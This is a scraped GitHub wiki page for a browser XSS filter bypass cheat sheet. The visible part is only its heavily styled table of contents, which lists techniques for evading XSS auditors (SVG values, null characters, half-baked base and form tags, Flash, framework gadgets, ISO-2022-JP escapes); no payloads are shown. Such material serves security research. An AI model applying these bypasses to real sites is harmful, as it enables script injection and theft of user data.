# Browser's XSS Filter Bypass Cheat Sheet

This page was edited by Masato Kinugawais Jul 7, 2018 · [33 revisions](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet/_history)

###  Pages 3

- <details class="details-reset" style="box-sizing: border-box; display: block;"><summary style="box-sizing: border-box; display: list-item; cursor: pointer; list-style: none; transition: color 80ms cubic-bezier(0.33, 1, 0.68, 1) 0s, background-color, box-shadow, border-color;"><div class="d-flex flex-items-start" style="box-sizing: border-box; align-items: flex-start !important; display: flex !important;"><div class="p-2 mt-n1 mb-n1 ml-n1 btn btn-octicon js-wiki-sidebar-toc-toggle-chevron-button " style="box-sizing: border-box; position: relative; display: inline-block; padding: 8px !important; font-size: 14px; font-weight: 500; line-height: 1; white-space: nowrap; vertical-align: middle; cursor: pointer; user-select: none; border: 0px; border-radius: 6px; appearance: none; color: var(--color-fg-muted); background: transparent; box-shadow: none; transition: color 80ms cubic-bezier(0.33, 1, 0.68, 1) 0s, background-color, box-shadow, border-color; margin-left: -4px !important; margin-top: -4px !important; margin-bottom: -4px !important;"><svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down js-wiki-sidebar-toc-toggle-chevron  mr-0"><path d="M4.427 7.427l3.396 3.396a.25.25 0 00.354 0l3.396-3.396A.25.25 0 0011.396 7H4.604a.25.25 0 00-.177.427z"></path></svg></div><a class="flex-1 py-1 text-bold" href="https://github.com/masatokinugawa/filterbypass/wiki" style="box-sizing: border-box; background-color: transparent; color: var(--color-accent-fg); text-decoration: none; flex-grow: 1 !important; flex-shrink: 1 !important; flex-basis: 0%; padding-top: 4px !important; padding-bottom: 4px !important; font-weight: 600 !important;">Home</a></div></summary></details>

- <details class="details-reset" open="" style="box-sizing: border-box; display: block;"><summary style="box-sizing: border-box; display: list-item; cursor: pointer; list-style: none; transition: color 80ms cubic-bezier(0.33, 1, 0.68, 1) 0s, background-color, box-shadow, border-color;"><div class="d-flex flex-items-start" style="box-sizing: border-box; align-items: flex-start !important; display: flex !important;"><div class="p-2 mt-n1 mb-n1 ml-n1 btn btn-octicon js-wiki-sidebar-toc-toggle-chevron-button " style="box-sizing: border-box; position: relative; display: inline-block; padding: 8px !important; font-size: 14px; font-weight: 500; line-height: 1; white-space: nowrap; vertical-align: middle; cursor: pointer; user-select: none; border: 0px; border-radius: 6px; appearance: none; color: var(--color-fg-muted); background: transparent; box-shadow: none; transition: color 80ms cubic-bezier(0.33, 1, 0.68, 1) 0s, background-color, box-shadow, border-color; margin-left: -4px !important; margin-top: -4px !important; margin-bottom: -4px !important;"><svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down js-wiki-sidebar-toc-toggle-chevron js-wiki-sidebar-toc-toggle-chevron-open mr-0"><path d="M4.427 7.427l3.396 3.396a.25.25 0 00.354 0l3.396-3.396A.25.25 0 0011.396 7H4.604a.25.25 0 00-.177.427z"></path></svg></div><a class="flex-1 py-1 text-bold" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet" style="box-sizing: border-box; background-color: transparent; color: var(--color-accent-fg); text-decoration: none; flex-grow: 1 !important; flex-shrink: 1 !important; flex-basis: 0%; padding-top: 4px !important; padding-bottom: 4px !important; font-weight: 600 !important;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Browser's XSS Filter Bypass Cheat Sheet</font></font></a></div></summary><ul class="list-style-none mx-4 px-1" style="box-sizing: border-box; padding-left: 4px !important; margin-top: 0px; margin-bottom: 0px; margin-right: 24px !important; margin-left: 24px !important; padding-right: 4px !important; list-style: none !important;"><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 0px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E7%9B%AE%E6%AC%A1" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">table of contents</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 0px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#xss-auditor" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;">XSS Auditor</a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 12px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E9%81%AE%E6%96%AD%E5%AF%BE%E8%B1%A1%E3%81%A7%E3%81%AA%E3%81%84%E3%82%82%E3%81%AE" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Items not subject to blocking</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E6%96%87%E5%AD%97%E5%88%97%E3%83%AA%E3%83%86%E3%83%A9%E3%83%AB%E3%81%A7%E8%B5%B7%E3%81%93%E3%82%8Bxss" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">XSS happening in string literals</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#url%E5%8D%98%E7%8B%AC%E3%81%A7%E6%88%90%E7%AB%8B%E3%81%99%E3%82%8Bxss%E5%85%A5%E5%8A%9B%E5%80%A4%E3%81%8C%E7%9B%B4%E6%8E%A5a%E3%82%BF%E3%82%B0%E3%81%AEhref%E9%83%A8%E5%88%86%E3%81%AB%E5%85%A5%E3%82%8B%E5%A0%B4%E5%90%88%E3%81%AA%E3%81%A9" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">XSS established by URL alone (such as when the input value is directly entered in the href part of the a tag)</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#2%E3%81%A4%E4%BB%A5%E4%B8%8A%E3%81%AE%E6%B3%A8%E5%85%A5%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%81%8C%E3%81%82%E3%82%8B%E5%A0%B4%E5%90%88" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">If you have 2 or more injection points</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E6%96%87%E5%AD%97%E5%88%97%E3%81%AE%E6%93%8D%E4%BD%9C%E3%81%8C%E3%81%82%E3%82%8B%E5%A0%B4%E5%90%88" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">If you have string operations</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E5%89%8A%E9%99%A4%E3%81%95%E3%82%8C%E3%82%8B%E5%A0%B4%E5%90%88" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">When deleted</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E7%BD%AE%E6%8F%9B%E3%81%95%E3%82%8C%E3%82%8B%E5%A0%B4%E5%90%88" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">When replaced</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E6%96%87%E5%AD%97%E5%88%97%E3%82%92documentwrite%E3%81%99%E3%82%8B%E3%82%82%E3%81%AE%E4%BB%A5%E5%A4%96%E3%81%AEdom-based-xss" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">DOM based XSS other than document.write() the request string</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#xml%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%A7%E3%81%AExss" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">XSS in XML pages</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#https%E3%83%AA%E3%83%B3%E3%82%AF%E3%81%AE%E4%BD%9C%E6%88%90" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">http(s): create link</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E5%A4%96%E9%83%A8%E3%81%AB%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%82%92%E9%80%81%E4%BF%A1%E3%81%A7%E3%81%8D%E3%82%8B%E3%82%BF%E3%82%B0" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Tags that can send requests to the outside</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E4%BB%BB%E6%84%8F%E3%81%AEcss%E3%81%AE%E8%A8%98%E8%BF%B0" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Arbitrary CSS description</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 12px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E3%83%90%E3%82%A4%E3%83%91%E3%82%B9" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">bypass</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#svg%E3%82%A2%E3%83%8B%E3%83%A1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AEvalues%E5%B1%9E%E6%80%A7%E3%81%AE%E5%88%A9%E7%94%A8safari%E3%81%AE%E3%81%BF" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using the SVG animation values attribute (Safari only)</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E8%A4%87%E6%95%B0%E3%81%AEnull%E6%96%87%E5%AD%97%E3%81%AE%E5%88%A9%E7%94%A8safari%E3%81%AE%E3%81%BF" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using multiple null characters (Safari only)</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#script%E3%82%BF%E3%82%B0%E5%86%85%E3%81%AE--%E3%81%AB%E3%82%88%E3%82%8B%E3%82%B3%E3%83%A1%E3%83%B3%E3%83%88%E3%81%AE%E5%88%A9%E7%94%A8safari%E3%81%AE%E3%81%BF" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using comments with --&gt; in script tags (Safari only)</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E5%8D%8A%E7%AB%AF%E3%81%AAbase%E3%82%BF%E3%82%B0%E3%81%AE%E5%88%A9%E7%94%A8safari%E3%81%AE%E3%81%BF" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using half-baked base tags (Safari only)</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#flash%E3%81%AE%E5%88%A9%E7%94%A8" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Use of Flash</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E7%9B%B8%E5%AF%BEurl%E3%81%A7%E3%83%AD%E3%83%BC%E3%83%89%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E3%81%AE%E5%88%A9%E7%94%A8" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using scripts loaded with relative URLs</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#iso-2022-jp%E3%81%AE%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97%E3%82%B7%E3%83%BC%E3%82%B1%E3%83%B3%E3%82%B9%E3%81%AE%E5%88%A9%E7%94%A8" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Use of ISO-2022-JP escape sequences</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E5%90%8C%E4%B8%80%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E3%81%AE%E3%83%AA%E3%82%BD%E3%83%BC%E3%82%B9%E3%81%AE%E5%88%A9%E7%94%A8" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Use of resources in the same domain</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E3%83%91%E3%82%B9%E3%81%ABxss%E3%81%8C%E3%81%82%E3%82%8B%E3%82%B1%E3%83%BC%E3%82%B9chrome%E3%81%AE%E3%81%BF" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Case with XSS in path (Chrome only)</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E3%82%A2%E3%83%83%E3%83%97%E3%83%AD%E3%83%BC%E3%83%89%E6%A9%9F%E8%83%BD" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">File upload function</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#flash%E3%81%A8flashvars%E3%81%AE%E5%88%A9%E7%94%A8" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using Flash and flashvars</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#flash%E3%81%AEexternalinterfaceobjectid%E3%81%A8externalinterfacecall%E3%81%AE%E5%88%A9%E7%94%A8" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using Flash's ExternalInterface.objectID and ExternalInterface.call()</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#angular%E3%81%AE%E5%88%A9%E7%94%A8" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using Angular</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#vuejs%E3%81%AE%E5%88%A9%E7%94%A8" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using Vue.js</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#jquery%E3%81%AE%E5%88%A9%E7%94%A8" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using jQuery</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#underscorejs%E3%81%AE%E5%88%A9%E7%94%A8" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using underscore.js</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 36px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#jsxtransformerbabel-standalone%E3%81%AA%E3%81%A9%E3%81%AEjsx%E5%A4%89%E6%8F%9B%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E3%81%AE%E5%88%A9%E7%94%A8" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using JSX transformation scripts such as JSXTransformer/babel-standalone</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#documentwrite%E6%99%82%E3%81%AB%E5%8D%8A%E7%AB%AF%E3%81%AA%E3%82%BF%E3%82%B0%E3%82%92%E5%88%A9%E7%94%A8%E3%81%99%E3%82%8Bchrome%E3%81%AE%E3%81%BF" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Use odd tags when document.write() (Chrome only)</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 24px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#%E5%8D%8A%E7%AB%AF%E3%81%AAform%E3%82%BF%E3%82%B0%E3%81%AE%E5%88%A9%E7%94%A8%E6%83%85%E5%A0%B1%E3%81%AE%E5%8F%96%E5%BE%97%E3%81%AE%E3%81%BFsafari%E3%81%AE%E3%81%BF" style="box-sizing: border-box; background-color: transparent; color: var(--color-fg-default)  !important; text-decoration: none;"><font style="box-sizing: border-box; vertical-align: inherit;"><font style="box-sizing: border-box; vertical-align: inherit;">Using half-baked form tags (getting information only) (Safari only)</font></font></a></li><li class="my-2" style="box-sizing: border-box; margin-top: 8px !important; margin-bottom: 8px !important; padding-left: 12px;"><a class="Link--primary" data-analytics-event="{&quot;category&quot;:&quot;Wiki&quot;,&quot;action&quot;:&quot;toc_click&quot;,&quot;label&quot;:null}" 